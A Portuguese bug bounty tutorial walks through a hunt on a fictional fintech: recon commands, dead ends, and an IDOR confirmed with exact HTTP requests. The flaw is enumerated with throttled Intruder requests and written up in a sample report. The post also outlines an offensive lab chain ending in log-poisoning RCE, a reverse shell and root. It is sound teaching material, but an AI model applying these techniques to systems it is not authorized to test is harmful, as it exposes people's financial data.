---
title: "Anatomia de uma Caçada: do Recon ao Report (walkthrough completo)"
description: "O post-finale da série: uma caçada fictícia-realista de ponta a ponta — ler o escopo, mapear a superfície, escolher onde atacar, achar um IDOR (com os becos sem saída), medir impacto, encadear e escrever o report. Como tudo se conecta na prática."
author: matheus
date: 2026-06-03 13:05:00 -0300
categories: [Bug Bounty, Avançado]
tags: ["bug bounty", "walkthrough", "recon", "IDOR", "BOLA", "business logic", "chaining", "report writing", "web security", "metodologia"]
image: /assets/img/covers/capstone-do-recon-ao-report.png
pin: false
comments: true
---

## O post que costura a série inteira

Você leu sobre [recon](/posts/recon-discovery/), [Broken Access Control](/posts/broken-access-control-idor-bola-bfla/), [business logic](/posts/business-logic/), [severidade](/posts/severidade-impacto-triagem/), [como escrever o report](/posts/como-escrever-report-que-paga/)... e agora tem uma coleção de peças soltas na cabeça. Este post é o **encaixe**. É a história de uma caçada inteira — do primeiro `cat scope.txt` até o "Triaged" chegando no e-mail — narrada como acontece de verdade: com hipóteses, **becos sem saída**, frustração, o momento *"peraí..."* e a hora de transformar tudo num report que paga.

> **Importante:** `app.exemplo.com` é um alvo **fictício**. Os comandos, requests e raciocínios são reais e reproduzíveis; o alvo, os dados e o programa são inventados. Nada aqui aponta pra empresa, domínio ou pessoa real. Esse é o padrão da série inteira.

O objetivo não é decorar os comandos — é ver o **raciocínio**. Por que parei naquele subdomínio? Por que abandonei aquela pista? O que fez o sino tocar? Bug bounty não é rodar scanner; é **perceber padrões que os outros não percebem**. Vamos lá.

> 💡 **Primitiva**: na gíria de segurança, uma "primitiva" é uma capacidade-base que o atacante ganha (ex.: "ler um arquivo", "fazer o servidor mandar uma request", "ler o objeto de outro usuário"). Você encadeia primitivas pra chegar no impacto. Detalhe no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).

---

## Fase 0 — Ler o escopo (a fase que ninguém pula impunemente)

Antes de qualquer ferramenta, eu abro a página do programa e leio **tudo**. Não é burocracia: o escopo decide se o seu achado vai pagar ou virar um *"out of scope, sorry"*.

No programa fictício de `app.exemplo.com` (uma fintech), as regras dizem:

```text
IN SCOPE:    *.exemplo.com  (todos os subdomínios)
OUT SCOPE:   blog.exemplo.com, status.exemplo.com (terceiros)
PROIBIDO:    automated scanning agressivo, DoS, engenharia social,
             testar com dados de clientes reais
RATE LIMIT:  máx. ~5 req/s por host
PAGA BEM:    IDOR/BOLA, ATO, business logic em fluxo de pagamento
PII:         vazamento de PII é tratado como High/Critical
```

> 💡 **PII**: *Personally Identifiable Information* — dado pessoal que identifica alguém (nome, CPF, e-mail, telefone, dados financeiros). Vazar PII costuma ser High/Critical.

> 💡 **ATO**: *Account Takeover* — tomar conta da conta de outra pessoa (login, sessão ou recuperação de senha quebrados). É um dos achados que mais paga.

Três coisas que eu já anoto na hora:

1. **Wildcard `*.exemplo.com`** → o recon de subdomínios vai render. Quanto mais host, maior meu campo de jogo.
2. **IDOR e business logic em pagamento "pagam bem"** → o programa está me dizendo onde olhar. Vou priorizar fluxos de dado sensível e dinheiro.
3. **Rate limit de ~5 req/s** → preciso segurar a mão nas ferramentas (vou usar `-t` baixo no [ffuf](/posts/recon-discovery/) e no Intruder), senão tomo block — ou pior, derrubo algo e violo a regra de "no DoS".

> 💡 **Escopo (in-scope / out-of-scope)**: a lista do que você **pode** e **não pode** testar num programa. Testar fora dela não paga e pode te expulsar — além de poder ser crime. [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).

> ⚠️ Existe programa que coloca **IDOR fora de escopo** e outro que paga ótimo nele. Ler isso **antes** evita gastar dias num bug que ninguém vai aceitar. A regra é simples: o escopo manda.

**Decisão da Fase 0:** já crio **duas contas** — `Conta A` e `Conta B` — porque pra provar IDOR/BOLA eu preciso do objeto de uma e da sessão da outra. Sem duas contas, o resto da caçada vira adivinhação. (O *porquê* disso está detalhado no post [10](/posts/broken-access-control-idor-bola-bfla/).)

---

## Fase 1 — Recon: mapeando a superfície

A lição mais cara do recon: **a falha que mais paga raramente está em `app.exemplo.com` (o domínio principal, blindado)** — está no subdomínio esquecido, no endpoint que só vive num arquivo JS. Então a Fase 1 é mapear *tudo*. Cada ferramenta usada aqui está explicada a fundo no post [01 — Recon & Discovery](/posts/recon-discovery/); aqui eu mostro o **fluxo de decisão**.

### 1.1 — Subdomínios (passivo primeiro)

```bash
# subfinder = enumerador passivo: pergunta a dezenas de fontes públicas
# (CT logs, agregadores de DNS) SEM tocar no alvo.
subfinder -d exemplo.com -all -silent -o subs.txt
wc -l subs.txt
# 47
```

Quarenta e sete candidatos. Agora **probing**: quais estão vivos? Pra isso o `httpx` (resolve e faz request, devolvendo status, título e tecnologia):

```bash
# -rl 5 = no máx. 5 requisições por segundo, pra respeitar o rate limit do programa
# (-rl controla req/s; -t controla threads/concorrência — quem segura a TAXA é o -rl)
cat subs.txt | httpx -silent -rl 5 -sc -title -tech-detect -o live.txt
```

A saída interessante (filtrei o ruído):

```text
https://app.exemplo.com        [200] [App principal]      [nginx, React]
https://api.exemplo.com        [200] [—]                  [nginx]
https://admin.exemplo.com      [403] [Forbidden]          [nginx]
https://reports.exemplo.com    [200] [Relatórios]         [nginx, React]
https://staging-app.exemplo.com[200] [App (staging)]      [nginx, React]   # <- olá
```

O olho treina pra parar em duas linhas: `staging-app` (ambiente de homologação, costuma ter menos camadas de proteção) e `reports` (relatórios = downloads = dado em massa = onde IDOR adora morar). Anotei as duas.

> 💡 **Recon passivo vs. ativo**: passivo coleta de fontes de terceiros (não toca no alvo); ativo manda request direto. Comece sempre pelo passivo — é silencioso e não queima rate limit. [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).

### 1.2 — URLs históricas e arquivos JS (o tesouro)

Aqui mora a regra de ouro: **os arquivos JavaScript são a melhor fonte de informação sobre uma aplicação.** Eles carregam os paths da API, nomes de parâmetros e rotas de admin que não aparecem clicando pela tela.

```bash
# gau coleta URLs históricas (Wayback, etc.); filtro só os .js vivos
echo "app.exemplo.com" | gau | grep '\.js$' | httpx -silent -mc 200 -ct | grep javascript
```

```text
https://app.exemplo.com/static/js/main.4f9c.js      [200] [application/javascript]
https://app.exemplo.com/static/js/billing.2a1b.js   [200] [application/javascript]
```

Baixei `billing.2a1b.js` e li **linha por linha** — não só joguei num extrator de paths. Essa é a diferença entre achar o que todo mundo acha e achar o que ninguém viu. Lá dentro:

```javascript
// trecho (desofuscado) de billing.2a1b.js
const API = "https://api.exemplo.com";
const getStatement   = (id)  => fetch(`${API}/v1/billing/statement?ref=${id}`);
const downloadReport = (rid) => fetch(`${API}/v1/reports/download`, {
  method: "POST", body: JSON.stringify({ reportId: rid })
});
const ADMIN_BLOCK = `${API}/v1/admin/accounts/block`; // <- rota de admin no JS do cliente!
```

Três achados num único arquivo:

- `GET /v1/billing/statement?ref=<id>` → pega um extrato por um identificador. **Cheira a IDOR.**
- `POST /v1/reports/download` com `{reportId}` no corpo → o clássico padrão de **download de relatório por ID** (campeão de token-swap; ver post [10](/posts/broken-access-control-idor-bola-bfla/)).
- `/v1/admin/accounts/block` → uma rota de **admin** referenciada no JS que o cliente comum baixa. Candidata a **BFLA** (executar função de admin com perfil comum).

> 💡 **Endpoint / rota**: um endereço específico que a aplicação atende (ex.: `/v1/billing/statement`). Mapear endpoints = mapear onde dá pra interagir com o sistema. [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).

### 1.3 — Logo de cara, autenticado

Logo no começo eu **logo na aplicação** com a Conta A e configuro o Burp como proxy. Por quê? Porque navegar autenticado já descarta as falhas que só existem no fluxo não-logado e me mostra a API "de verdade" — com tokens válidos, parâmetros reais e os fluxos que importam (pagamento, perfil, relatórios). O Burp vai gravando tudo no **HTTP history**, que vira meu mapa real de endpoints.

**Decisão da Fase 1:** tenho um mapa. Candidatos quentes: o `?ref=` do extrato, o `POST /reports/download`, e a rota `/admin/accounts/block`. Hora de escolher por onde começar.

---

## Fase 2 — Escolher a superfície (e por quê)

Tenho três pistas. Não dá pra atacar tudo de uma vez com cabeça — eu **priorizo** com base no que o escopo disse que paga e no esforço pra confirmar:

| Candidato | Padrão suspeito | Impacto se confirmar | Esforço |
|---|---|---|---|
| `GET /billing/statement?ref=` | IDOR por ID na URL | Vazamento de PII/financeiro | Baixo |
| `POST /reports/download {reportId}` | BOLA/token-swap | PII em massa (relatórios) | Médio |
| `POST /admin/accounts/block` | BFLA | Ação crítica (bloquear conta) | Médio |

Começo pelo **`?ref=`**: é o de **menor esforço pra confirmar** (um GET, troco um número no Repeater — a aba do Burp pra editar e reenviar uma request manualmente, quantas vezes quiser) e o escopo grita "IDOR paga bem". Regra de caçador: vá primeiro no que confirma rápido. Se der certo, ótimo; se der errado, aprendi o comportamento da API e sigo pro próximo.

> 💡 **IDOR vs. BOLA vs. BFLA**: IDOR/BOLA = acesso indevido a um **objeto** de outro (o extrato dele); BFLA = acesso indevido a uma **função** de outro perfil (a ação de admin). Tudo é Broken Access Control. Aprofundado no post [10](/posts/broken-access-control-idor-bola-bfla/).

---

## Fase 3 — A caçada (com os becos sem saída)

Aqui é onde os tutoriais mentem: eles mostram só o caminho que deu certo. A realidade tem **becos sem saída** — e é justamente apanhar neles que ensina o comportamento do alvo. Vou narrar honesto.

### Beco sem saída #1 — o `?ref=` que parecia óbvio

Logado como **Conta A**, abro um extrato. O Burp registra:

```http
GET /v1/billing/statement?ref=88213 HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_A>
```

No Repeater, troco `88213` por `88212` (decrementar é o teste mais rápido de ID sequencial):

```http
GET /v1/billing/statement?ref=88212 HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_A>   # <- mesma Conta A, ID de outro
```

Resposta:

```http
HTTP/2 403 Forbidden
{"error":"forbidden","message":"You do not own this resource"}
```

`403`. **Aqui a aplicação faz a checagem de dono certa.** Tentei `88214`, `1`, `99999`: todos `403` ou `404`. Beco sem saída — *neste* endpoint.

Mas atenção ao detalhe: o servidor respondeu **"You do not own this resource"**. Isso me diz que existe uma noção de "dono" amarrada ao recurso. Guardei a frase. Não saí do alvo com raiva; saí com **informação**.

> Lição transferível: um `403` não é o fim, é um **dado**. Ele me ensinou que *este* caminho valida dono. A pergunta vira: *existe um caminho que esquece de validar?*

### Beco sem saída #2 — o token-swap no download

Vou pro segundo candidato, o `POST /v1/reports/download`. Padrão clássico de **troca de token** (post [10](/posts/broken-access-control-idor-bola-bfla/)): a `Conta A` tem acesso ao relatório, a `Conta B` não. Disparo com a A e, no Burp, troco só o `Authorization` pelo da B:

```http
POST /v1/reports/download HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_B>   # <- troquei (era da Conta A)
Content-Type: application/json

{"reportId": 4471}
```

```http
HTTP/2 403 Forbidden
{"error":"plan_required","message":"Reports require Business plan"}
```

`403` de novo — mas por um motivo diferente: a Conta B é de plano grátis e relatório é feature paga. A autorização de **função** está sendo checada. Outro beco. (Anotei: *"e se a Conta B virar plano Business sem pagar? business logic..."* — guardei pra depois, é uma pista de [post 20](/posts/business-logic/).)

Dois `403` seguidos. É o ponto onde o iniciante fecha o Burp. O caçador faz outra pergunta.

### O momento "aha" — voltar pro `?ref=` com outros olhos

Reli meu HTTP history procurando **todo lugar onde um `ref`/`statement` aparece**. E achei uma request que tinha passado batido: ao abrir o extrato, o front faz **duas** chamadas. A primeira eu já conhecia. A segunda era pra **gerar o PDF da nota**:

```http
POST /v1/billing/statement/export HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_A>
Content-Type: application/json

{"ref":"88213","format":"pdf"}
```

E a **resposta** dessa chamada trazia algo curioso:

```http
HTTP/2 200 OK
{"downloadToken":"eyJyZWYiOiI4ODIxMyIsImV4cCI6...","url":"/files/8f3c1a.pdf"}
```

A API me devolveu um **`downloadToken`** — um valor opaco/assinado que codifica o `ref`. O `/billing/statement?ref=` valida dono... mas será que o **endpoint que consome esse token** revalida? Ou ele confia cegamente no que está dentro do token (que a *própria API* gerou)?

Isso me lembrou de um padrão real famoso: uma API que, na resposta, **te devolve o seu próprio parâmetro já "protegido"**, e aí você reaproveita esse valor protegido em outra request. Você não quebra a criptografia — você só **reusa o que o servidor te deu**. (Variação avançada de IDOR; ver "IDs protegidos" no post [10](/posts/broken-access-control-idor-bola-bfla/).)

O `downloadToken` é **Base64URL** (alfabeto com `-`/`_` e, em geral, sem o `=` de padding). Decodifiquei só pra **entender** o formato (não pra forjar nada) — por isso normalizo o alfabeto com `tr` antes do `base64 -d`, senão o GNU `base64` reclama de "invalid input":

```bash
# tr '_-' '/+' converte Base64URL → Base64 padrão. Sem o '=' de padding, o GNU base64
# decodifica o trecho válido mas grita "invalid input" no stderr; 2>/dev/null silencia isso.
echo 'eyJyZWYiOiI4ODIxMyIsImV4cCI6...' | tr '_-' '/+' | base64 -d 2>/dev/null
# {"ref":"88213","exp":...}
```

Ele carrega o `ref` lá dentro. Hipótese cristalizada: **se eu pedir o `export` com o `ref` de outra conta, talvez o servidor me devolva um `downloadToken` válido pra aquele `ref`** — e o endpoint de download não revalide o dono, porque "o token foi a própria API que assinou".

### Confirmando o "aha"

Pedi o `export` com um `ref` que **não é meu** (ainda como Conta A):

```http
POST /v1/billing/statement/export HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_A>
Content-Type: application/json

{"ref":"88212","format":"pdf"}   # <- ref de OUTRO cliente
```

```http
HTTP/2 200 OK
{"downloadToken":"eyJyZWYiOiI4ODIxMiIsImV4cCI6...","url":"/files/2b7e90.pdf"}
```

**200.** O endpoint de `export` **não checa dono** — só o `GET /statement?ref=` checava. A API acabou de me assinar um token pro extrato de outra pessoa. Agora baixo o PDF:

```http
GET /files/2b7e90.pdf HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_A>
```

```http
HTTP/2 200 OK
Content-Type: application/pdf
Content-Length: 184213
%PDF-1.7 ... (extrato com nome, CPF mascarado e valores de OUTRO cliente)
```

PDF aberto: **nome, documento e valores de um cliente que não sou eu.** Para de tudo. Isso é um **IDOR/BOLA** confirmado: o caminho "principal" valida dono, mas o caminho de `export` esqueceu — e como ele me devolve um token assinado, o download nem precisa revalidar. A falha de fundo é **autorização ausente no endpoint de export**, mascarada por um token que parecia "seguro".

> **Por que o `?ref=` dava 403 e o `export` não?** Times grandes implementam autorização **endpoint a endpoint**, não centralizado. Alguém lembrou de checar dono no `GET`, esqueceu no `POST /export`. É o padrão de raiz de quase todo BOLA: a checagem **não é por objeto, em todo lugar**.

---

## Fase 4 — Medir impacto e provar escala

Achar uma falha é metade; o **dinheiro está no impacto**, e impacto = *dado sensível* + *escala* (post [02 — Severidade & Impacto](/posts/severidade-impacto-triagem/)). Um único PDF é "um caso"; mil PDFs é "vazamento de PII em massa".

O `ref` é **sequencial** (`88212`, `88213`...). Logo, dá pra enumerar. Mas com **disciplina ética e de escopo**: o programa pede máx. ~5 req/s e proíbe scanning agressivo. Então uso o **Burp Intruder** em modo `Sniper` (varia uma posição por vez) com **throttle**, e só o suficiente pra **provar o conceito** — não pra baixar a base inteira de ninguém.

```http
POST /v1/billing/statement/export HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_A>
Content-Type: application/json

{"ref":"§88200§","format":"pdf"}   # Intruder: payload numérico 88200–88230
```

Configuro: payload type *Numbers*, de `88200` a `88230` (faixa pequena, ~30 requests), com *Resource pool* limitando a concorrência e um delay → fica abaixo dos 5 req/s. Resultado: **a maioria responde `200`** com `downloadToken` distinto. Trinta refs sequenciais, trinta tokens válidos de extratos diferentes. **Está provado que é enumerável** — e eu paro por aí, porque trinta já demonstram o padrão sem precisar tocar em dado de cliente real em volume.

> ⚠️ **Não enumere a base inteira.** Provar com uma faixa pequena (e parar) demonstra o impacto. Baixar milhares de PDFs de PII real é, na melhor das hipóteses, antiético e fora do escopo; na pior, ilegal. O triador entende "30 refs sequenciais retornam 200" como prova de escala — você não precisa do banco todo.

**O que a tela do Burp mostraria:** aba *Intruder → Results* com a coluna *Status* cheia de `200` para payloads sequenciais (`88201`, `88202`, ...) e *Length* variando (PDFs diferentes); ao lado, um Repeater com a Response do `export` mostrando um `downloadToken` cujo `ref` decodificado não pertence à conta logada — o `ref` trocado destacado em vermelho.

**Severidade:** vazamento de PII financeira (extratos com nome/documento) acessível por qualquer cliente autenticado, em escala (IDs sequenciais). Pelo [CVSS](/posts/severidade-impacto-triagem/) (o padrão de mercado que vira uma nota de 0 a 10 pra ranquear a gravidade de uma falha), confidencialidade alta, sem privilégio especial, sem interação da vítima → faixa **High/Critical** (o vetor CVSS v3.1 e o v4.0 fechados eu coloco no report, na Fase 6). Em programas reais, esse perfil paga de **alguns milhares a dezenas de milhares de reais**, conforme o programa.

---

## Fase 5 — Talvez encadear (chaining)

Antes de reportar, sempre pergunto: **essa primitiva destrava outra coisa?** Encadear é o que transforma um High num Critical (a arte do encadeamento tem post próprio — [26 — Chaining](/posts/chaining-vulnerabilidades/)).

Reviso minhas anotações dos becos sem saída — porque becos viram elos:

- **Beco #2 (relatório exige plano Business)** + a lógica de planos. Se existir um fluxo que muda o plano da conta sem validar pagamento (um clássico [business logic](/posts/business-logic/)), eu "viro Business" de graça e **destravo o `POST /reports/download`** — que provavelmente vaza PII de *vários* clientes de uma vez (relatório agregado), elevando o impacto.
- **A rota `/v1/admin/accounts/block`** vista no JS. Se ela aceitar o token de um usuário comum, é **BFLA** (ação crítica: bloquear contas alheias). Vale um teste rápido.

Testo a rota de admin com o token comum (Conta A, sem privilégio):

```http
POST /v1/admin/accounts/block HTTP/2
Host: api.exemplo.com
Authorization: Bearer <token_Conta_A>   # <- usuário comum, sem privilégio
Content-Type: application/json

{"accountId": 88212}
```

```http
HTTP/2 403 Forbidden
{"error":"admin_scope_required"}
```

`403` — **aqui a autorização de função está certa.** (Nota de detalhe: como a Conta A *está autenticada* e só lhe falta o privilégio de admin, o correto é `403 Forbidden`, não `401 Unauthorized` — `401` é "não sei quem você é", `403` é "sei quem você é, mas você não pode".) Beco. Sem problema: testei, documentei mentalmente, segui. Nem todo fio vira nó.

**Decisão da Fase 5:** o IDOR no `export` já é um achado **forte e autossuficiente**. A cadeia "burlar plano → download de relatórios" exigiria confirmar primeiro a falha de plano (outra investigação). Decido **reportar o IDOR agora** (achado sólido, alto impacto, não corro risco de outro hunter reportar antes) e, em paralelo, investigar a falha de plano como **report separado** se ela se confirmar. Sentar em cima de um Critical esperando "a cadeia perfeita" é como muitos perdem o bug pra um duplicado.

> Lição transferível: **reporte o que já está sólido.** Encadear é ótimo, mas um Critical no caixa hoje vale mais que um "talvez Critical maior" que vira duplicado amanhã.

---

## Fase 6 — Escrever o report que paga

A falha está provada. Agora vem a parte que **separa quem acha de quem recebe**: comunicar pro programa de um jeito que o triador entenda o risco em 30 segundos e não tenha o que questionar. A estrutura completa está no post [03 — Como escrever um report que paga](/posts/como-escrever-report-que-paga/); aqui está o report desta caçada, no formato que funciona:

---

**Título:** `[IDOR/BOLA] Exposição de extratos financeiros (PII) via endpoint de export sem checagem de dono`

**Resumo (o risco pro negócio):**
> Qualquer cliente autenticado consegue baixar o extrato financeiro (PDF com nome e documento) de **qualquer outro cliente**, apenas trocando o parâmetro `ref` no endpoint `POST /v1/billing/statement/export`. Como o `ref` é sequencial, a falha é **enumerável em escala**, configurando vazamento massivo de PII e violação de privacidade (LGPD — a lei brasileira de proteção de dados pessoais, que obriga a empresa a guardar bem esses dados). O endpoint de leitura (`GET /statement`) valida o dono, mas o de export **não** — e ele assina um `downloadToken` que o download aceita sem revalidar.

**Severidade:** High → Critical — confidencialidade de PII financeira, sem privilégio especial, em escala. (Como medir: post [02](/posts/severidade-impacto-triagem/).)
> - **CWE-639** — Authorization Bypass Through User-Controlled Key.
> - **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → **6.5 (Medium)** é o piso pela leitura de um objeto. Como o acesso cruza a fronteira de **outras contas**, defendo **`S:C`** (*Scope Changed*): `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` → **7.7 (High)**.
> - **CVSS v4.0 (CVSS-B):** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` → **7.1 (High)**. (A v4.0 não tem `Scope`; o vazamento fica na confidencialidade do **sistema vulnerável** — `VC:H`, sem impacto subsequente. Recalcule sempre na [calculadora v4.0](https://www.first.org/cvss/calculator/4.0).)
> - **Argumento de subida:** somando **escala** (base inteira via `ref` sequencial) + **sensibilidade** (extrato com nome/documento, sob LGPD), o impacto de negócio é tratado como **Critical** pela maioria dos programas — é o número que defendo no Impacto.

**Passos para reproduzir** (numerados, qualquer um repete):
> 1. Autenticar como **Conta A** (cliente comum). Abrir um extrato e capturar a chamada `POST /v1/billing/statement/export` com o seu `ref` (PRINT 1).
> 2. No Burp Repeater, **trocar o `ref` pelo de outro cliente** (ex.: decrementar). O servidor retorna `200` com um `downloadToken` válido para o `ref` alheio (PRINT 2):
>    ```http
>    POST /v1/billing/statement/export HTTP/2
>    Host: api.exemplo.com
>    Authorization: Bearer <token_Conta_A>
>    Content-Type: application/json
>
>    {"ref":"88212","format":"pdf"}
>    ```
> 3. Acessar a `url` retornada (`GET /files/<id>.pdf`) — o PDF é o extrato de **outro cliente**, com nome e documento (PRINT 3).
> 4. **Escala:** no Intruder (Sniper, `ref` numérico, faixa pequena 88200–88230, com throttle ≤5 req/s), a maioria retorna `200` com tokens distintos, comprovando enumeração sequencial (PRINT 4).

**Impacto:** vazamento de PII financeira de toda a base de clientes; risco de fraude, phishing direcionado e violação de LGPD.

**Correção sugerida:** validar a propriedade do recurso **no endpoint de export** (e em todo endpoint que receba `ref`), não só no `GET`: `WHERE ref = ? AND owner_id = <usuário_da_sessão>`. Trocar IDs sequenciais por UUID **não substitui** a checagem de dono (post [10](/posts/broken-access-control-idor-bola-bfla/)).

---

Por que esse report passa fácil na triagem (lições dos posts [02](/posts/severidade-impacto-triagem/) e [03](/posts/como-escrever-report-que-paga/)):

- **Resumo fala de risco ao negócio**, não de detalhe técnico solto. O triador entende o estrago em uma frase.
- **Passos reproduzíveis ao nível de "qualquer um repete"**, com a request exata e indicação de onde cada print entra.
- **Escala demonstrada** com sobriedade (faixa pequena), sem ter torrado a base de PII de ninguém.
- **Correção sugerida** mostra que você entendeu a raiz — e ajuda o time a fechar rápido (triagem feliz, bounty mais rápido).
- **Certeza absoluta da falha antes de enviar.** Report meia-boca gera ida e volta; report redondo vira "Triaged" no mesmo dia.

---

## Recap: como cada post da série apareceu nesta caçada

| Fase da caçada | O que usei | Post da série |
|---|---|---|
| Ler escopo, mindset, HTTP, Burp | Fundamentos, autn × autz | [00](/posts/fundamentos-web-hacking/) |
| Subdomínios, httpx, gau, **JS analysis** | Mapear superfície | [01](/posts/recon-discovery/) |
| Achar o IDOR/BOLA (export + token reuse) | A falha em si | [10](/posts/broken-access-control-idor-bola-bfla/) · [25](/posts/api-security/) |
| Pista de "virar Business sem pagar" | Falha de fluxo/regra | [20](/posts/business-logic/) |
| Pensar em encadear becos → impacto maior | Chaining | [26](/posts/chaining-vulnerabilidades/) |
| Medir CVSS, definir High/Critical | Severidade & impacto | [02](/posts/severidade-impacto-triagem/) |
| Escrever o report redondo | Comunicação que paga | [03](/posts/como-escrever-report-que-paga/) |

A série inteira é exatamente este fluxo, fatiado em capítulos. Esta caçada foi o filme com tudo junto.

---

## As lições transferíveis (o mindset que fica)

Decore *isto*, não os comandos:

1. **O escopo é o tabuleiro.** Lê primeiro, sempre. Ele te diz onde o ouro paga e onde você não pode pisar.
2. **Recon define o tamanho do seu jogo.** A falha mora no subdomínio esquecido e no arquivo JS — leia o JS **linha por linha**, não só extraia paths.
3. **Becos sem saída são dados, não fracassos.** Um `403` te ensina *onde* a aplicação valida — e a próxima pergunta é "onde ela esquece?".
4. **A checagem de autorização raramente é uniforme.** Se o `GET` valida dono, teste o `POST`, o `export`, o `PUT`. O bug está no endpoint que o dev esqueceu.
5. **"Seguro" pode ser uma ilusão.** Um token assinado/criptografado que a *própria API* te entrega pode ser só um IDOR de luxo. Você reusa, não quebra.
6. **Impacto = dado sensível × escala** — e você prova a escala com **sobriedade**, não destruindo a base de ninguém.
7. **Reporte o que está sólido.** Encadear é arte, mas um Critical hoje vale mais que um "talvez maior" que duplica amanhã.
8. **O report é metade do trabalho.** Quem comunica risco em uma frase e dá passos reproduzíveis recebe primeiro.

E o meta-mindset que costura tudo: **analise o fluxo, não rode só checklist.** A maioria joga mil ferramentas e segue lista. O diferencial não está no *que você olha*, e sim no *que você percebe* — o padrão invisível que só aparece quando você para e pensa "peraí, por que essa request me devolveu isso?".

> 💡 **Dica de ouro do finale:** toda caçada boa é uma sequência de **perguntas melhores**. "E se eu trocar esse número?" abre a porta. "Por que *aqui* deu 403 e *ali* não?" é o que paga.

## Como aplicar — checklist da caçada completa

- [ ] Li o **escopo** inteiro: in/out-scope, rate limit, o que paga, o que é proibido.
- [ ] Criei **2 contas** (perfis diferentes) antes de testar acesso.
- [ ] Recon: subdomínios (passivo → ativo), httpx, gau, e **li os arquivos JS linha por linha**.
- [ ] Loguei autenticado e deixei o Burp gravando o **HTTP history** como mapa real.
- [ ] Priorizei a superfície por **(impacto × baixo esforço de confirmar)**.
- [ ] Tratei cada `403`/`401` como **dado**: anotei onde a app valida e onde pode esquecer.
- [ ] Testei o identificador em **GET, POST, export, PUT** e no **corpo/headers** (não só na URL).
- [ ] Desconfiei de **tokens/valores "protegidos" que a própria API devolve** (reuso ≠ quebra).
- [ ] Provei **escala** com uma faixa pequena e **throttle** — sem torrar PII real.
- [ ] Procurei **chaining** entre os becos antes de reportar.
- [ ] Escrevi o report: **título padronizado, resumo de risco, passos reproduzíveis, impacto, correção.**
- [ ] Tive **certeza absoluta** da falha antes de enviar.

## Estudo de caso real: a máquina CyberWaf (HackingClub)

A caçada acima é fictícia (pra ensinar o *método*). Pra ver as mesmas peças numa cadeia **real e reproduzível**, vale destrinchar a máquina **CyberWaf** da [HackingClub](https://hackingclub.com) — um lab autorizado. Repare como quase todo capítulo deste guia aparece, um puxando o outro:

1. **Recon ([Recon & Discovery](/posts/recon-discovery/)).** O `nmap` acha as portas; o IP redireciona pra `cyberwaf.hc` (entra no `/etc/hosts`). Fuzzing de **vhost** (`ffuf -H "Host: FUZZ.cyberwaf.hc"`) revela o subdomínio `admin.`.
2. **`.git` exposto → código-fonte ([Security Misconfiguration](/posts/security-misconfiguration-cve-hunting/)).** O `ffuf` acha `/.git/`; o `git-dumper` baixa o repositório inteiro; `git log` entrega um usuário válido (`aurora@cyberwaf.hc`). Vira **whitebox**.
3. **Auth bypass por type juggling ([Account Takeover](/posts/account-takeover/)).** O login compara `md5($senha) == $hash` com `==` (loose) e o hash armazenado é um **magic hash** → `aurora : QNKCDZO` autentica sem a senha real.
4. **SQLi mesmo com PDO ([SQL Injection](/posts/sql-injection/)).** O endpoint usa prepared statement, mas o **nome da coluna** vem do usuário; confundindo o parser do PDO (placeholder + byte nulo) dá pra enumerar o `information_schema` e extrair a tabela `users` → outro hash MD5, quebrado no CrackStation → login privilegiado.
5. **LFI → RCE via log poisoning do WAF ([LFI/Path Traversal](/posts/lfi-path-traversal/)).** A rota `/admin` inclui um arquivo `.log` controlável (LFI restrito a `.log`). O alvo roda **ModSecurity**: o WAF bloqueia o payload mas o **grava** no `modsec_audit.log` → você envenena o log *através do WAF* e o inclui → **RCE** como `www-data` → reverse shell.
6. **Pós-exploração (já fora do "web", mas pro panorama).** O `www-data` acha um **socket de SSH agent** esquecido em `/tmp` (`SSH_AUTH_SOCK`) → vira o usuário `aurora` por SSH. E `sudo -l` mostra `/usr/bin/below` executável como root → **CVE-2025-27591** (privesc por *symlink* no log do `below`) → **root**.

A lição do capstone se confirma: **bug isolado é degrau; o impacto mora no encadeamento.** Cada elo aqui tem um capítulo dedicado neste guia — e a cadeia inteira partiu de um `.git` esquecido.

## Nota ética

Tudo aqui é pra **alvos autorizados** — programas de bug bounty dentro do escopo, pentests contratados e labs legais. O `app.exemplo.com` é fictício; os dados, inventados. Repare que até *na narrativa* eu respeitei o rate limit e parei a enumeração ao provar o conceito — isso não é só etiqueta, é parte da regra do jogo: enumerar a base inteira de PII real, mesmo num programa, te tira do programa e pode ser crime (no Brasil, art. 154-A do CP). Pratique em [PortSwigger Academy](https://portswigger.net/web-security/all-labs), DVWA, TryHackMe, HackTheBox e HackingClub à vontade — lá você quebra tudo sem culpa. Use pra **proteger**, reportar com responsabilidade e ensinar.

## Referências

- [OWASP API1:2023 — Broken Object Level Authorization (BOLA)](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP WSTG — Testing for BOLA (API)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization)
- [PortSwigger — Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger Web Security Academy — All labs (gratuito)](https://portswigger.net/web-security/all-labs)
- [reddelexc/hackerone-reports — Top IDOR reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPIDOR.md)

---
